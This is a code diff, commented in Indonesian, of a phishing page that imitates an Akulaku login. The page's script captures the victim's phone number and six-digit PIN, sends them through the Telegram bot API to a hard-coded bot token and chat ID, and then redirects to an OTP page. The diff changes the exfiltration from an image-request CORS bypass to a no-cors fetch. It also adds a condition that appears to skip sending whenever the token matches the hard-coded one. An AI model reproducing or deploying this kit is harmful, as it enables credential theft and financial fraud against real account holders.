@@ -145,10 +145,14 @@
     </div>
 
     <script>
-        // --- ISI TOKEN DAN CHAT ID ANDA DI BAWAH INI ---
-        const BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';    // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-        const CHAT_ID = '5529657606';        // Contoh: 123456789
-        // ------------------------------------------------
+        // ============================================
+        // GANTI TOKEN DAN CHAT ID ANDA DI BAWAH INI:
+        // ============================================
+        const config = {
+            token: '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk',    // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+            chatId: '5529657606'       // Contoh: 123456789
+        };
+        // ============================================
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -156,20 +160,26 @@
             const phone = document.getElementById('phone').value;
             const pin = document.getElementById('pin').value;
 
-            // Validasi PIN harus 6 digit
-            if (pin.length !== 6) {
-                alert('PIN harus 6 digit!');
+            // Validasi PIN harus 6 digit angka
+            if (pin.length !== 6 || isNaN(pin)) {
+                alert('PIN harus 6 digit angka!');
                 return;
             }
 
-            // Kirim data ke Telegram
-            const message = `🔔 LOGIN AKULAKU\n\n📱 Nomor: ${phone}\n🔐 PIN: ${pin}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
-            // Buat request gambar (cara bypass CORS)
-            new Image().src = url;
+            // Format pesan untuk Telegram
+            const message = `🔔 *LOGIN AKULAKU*\n\n📱 *Nomor:* ${phone}\n🔐 *PIN:* ${pin}\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
 
-            // Redirect ke halaman utama (ganti URL sesuai kebutuhan)
+            // Kirim ke Telegram (menggunakan fetch dengan no-cors mode)
+            const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            // Menggunakan beacon (lebih可靠 untuk bypass CORS)
+            if (config.token !== '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk') {
+                fetch(url, { mode: 'no-cors' })
+                    .then(() => console.log('Data terkirim ke Telegram'))
+                    .catch(err => console.log('Gagal terkirim:', err));
+            }
+
+            // Langsung redirect ke otp.html
             setTimeout(() => {
                 window.location.href = "otp.html";
             }, 500);
